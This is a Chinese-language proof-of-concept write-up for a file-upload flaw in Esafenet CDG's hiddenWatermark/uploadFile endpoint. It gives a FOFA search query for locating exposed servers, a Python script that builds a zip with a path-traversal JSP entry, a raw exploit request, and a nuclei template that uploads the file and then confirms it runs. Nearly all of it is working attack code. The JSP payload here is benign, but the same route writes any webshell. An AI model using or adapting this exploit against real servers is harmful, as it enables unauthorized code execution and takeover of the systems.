## 亿赛通电子文档安全管理系统hiddenWatermark文件上传漏洞

亿某通电子文档安全管理系统 hiddenWatermark/uploadFile接口处存在文件上传漏洞，恶意攻击者可能上传恶意文件进而获取服务器的控制权限

## fofa
```
app="亿赛通电子文档安全管理系统"
```

## 使用py文件构造压缩包脚本
```python
import zipfile
 
def tests(evil_file_name, zip_data):
    with zipfile.ZipFile(evil_file_name, 'w') as zip_file:
        for key, value in zip_data.items():
            print("Key:", key)
 
            # 重命名文件
            zip_info = zipfile.ZipInfo(key)
            zip_info.compress_type = zipfile.ZIP_DEFLATED
            zip_file.writestr(zip_info, value)
 
# 定义 zipData 字典
zip_data = {
    "../../../js/ceshi.jsp": "<%\n out.println(\"Hello World!\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>",
    "theme/theme/theme1.xml": "<!--{\"FileName\":\"aaa\",\"FileSize\":\"222\",\"UserName\":\"aa\",\"Department\":\"aa\",\"UserID\":\"aa\",\"time\":\"123\"}-->"
}
 
try:
    tests("ceshi.zip", zip_data)
except Exception as e:
    print(e)
```

## poc
```
POST /CDGServer3/hiddenWatermark/uploadFile HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3lm0J8uEuFHxy191
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
 
------WebKitFormBoundary3lm0J8uEuFHxy191
Content-Disposition: form-data; name="doc"; filename="ceshi.zip"
Content-Type: application/zip
 
{{file(压缩包文件路径)}}
------WebKitFormBoundary3lm0J8uEuFHxy191--
```

![3c04d6758ef8a4ed73dc917e054bfb8f](https://github.com/wy876/POC/assets/139549762/6f1b065b-3681-450c-808d-1697f494100e)

## nuclei
```

id: CDG-hiddenWatermark-uploadFile-uploadfile

info:
  name: 亿某通电子文档安全管理系统 hiddenWatermark/uploadFile接口处存在文件上传漏洞 攻击者可通过该漏洞在服务器端任意执行代码 写入后门， 获取服务器权限 进而控制整个 web 服务器
  author: WLF
  severity: high
  metadata: 
    fofa-query: body="/CDGServer3/index.jsp"
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        POST /CDGServer3/hiddenWatermark/uploadFile HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3lm0J8uEuFHxy191
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 0

        ------WebKitFormBoundary3lm0J8uEuFHxy191
        Content-Disposition: form-data; name="doc"; filename="{{filename}}.zip"
        Content-Type: application/zip
        
        {{base64_decode("UEsDBBQAAAAIAAAAIQD5T26PZgAAAHAAAAAVAAAALi4vLi4vLi4vanMvY2VzaGkuanNwHcgxDsIwDAXQnVOESpXixRcoYkSMCAZmq/0CIysOqVuuD2V879Dvki/BtWkJK7k7w8zT3ZtN+46Ggk96ySqszic1ZKnVdJRQL/xAXCF2kXjmhveCOba7oa2G+DcR8YSfkGlI/fELUEsDBBQAAAAIAAAAIQDGTjiHSQAAAGcAAAAWAAAAdGhlbWUvdGhlbWUvdGhlbWUxLnhtbLNR1NWtVnLLzEn1S8xNVbJSSkxMVNIBCwRnVoEEjIyMgAKhxalFcBVAvktqQWJRSW5qXglMBKTC0wXGK8kEqzU0Mlaq1dW1AwBQSwECFAAUAAAACAAAACEA+U9uj2YAAABwAAAAFQAAAAAAAAAAAAAAgAEAAAAALi4vLi4vLi4vanMvY2VzaGkuanNwUEsBAhQAFAAAAAgAAAAhAMZOOIdJAAAAZwAAABYAAAAAAAAAAAAAAIABmQAAAHRoZW1lL3RoZW1lL3RoZW1lMS54bWxQSwUGAAAAAAIAAgCHAAAAFgEAAAAA")}}
        ------WebKitFormBoundary3lm0J8uEuFHxy191--
        

      - |
        GET /CDGServer3/js/ceshi.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"Hello World!")
```
